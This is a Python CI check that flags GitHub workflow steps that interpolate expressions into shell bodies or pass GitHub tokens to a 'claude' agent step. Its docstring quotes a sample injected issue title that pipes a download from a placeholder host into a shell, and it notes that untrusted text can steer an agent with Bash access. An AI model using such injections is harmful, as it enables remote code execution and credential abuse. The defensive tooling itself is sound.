#!/usr/bin/env python3
"""Fail if a reusable workflow reintroduces either of the two defects that
made shell injection possible.

1. `${{ ... }}` inside a `run:` body. GitHub substitutes those before bash
   sees the script, so an issue title of `x'; curl evil.sh | sh; #` becomes
   shell. Values must reach the shell through `env:` and be read as "$VAR".
2. A GitHub credential in the same step as a `claude` invocation. The agent
   has unrestricted Bash and is steered by untrusted text, so a token in its
   environment is a write-capable credential handed to it.
"""
import glob
import re
import sys

import yaml

EXPR = re.compile(r"\$\{\{[^}]*\}\}")
failures = []

for path in sorted(glob.glob(".github/workflows/reusable-*.yml")):
    doc = yaml.safe_load(open(path))
    for job_name, job in (doc.get("jobs") or {}).items():
        for step in job.get("steps") or []:
            body = step.get("run", "")
            where = f"{path}:{job_name}:{step.get('name', step.get('id', '?'))}"
            found = EXPR.findall(body)
            if found:
                failures.append(f"{where}: expression in run: body: {found}")
            env = step.get("env") or {}
            if "claude " in body and ({"GH_TOKEN", "GITHUB_TOKEN"} & set(env)):
                failures.append(f"{where}: GitHub token shares a step with claude")

for line in failures:
    print(f"error: {line}")
print(f"{'FAIL' if failures else 'ok'}: checked reusable workflows")
sys.exit(1 if failures else 0)
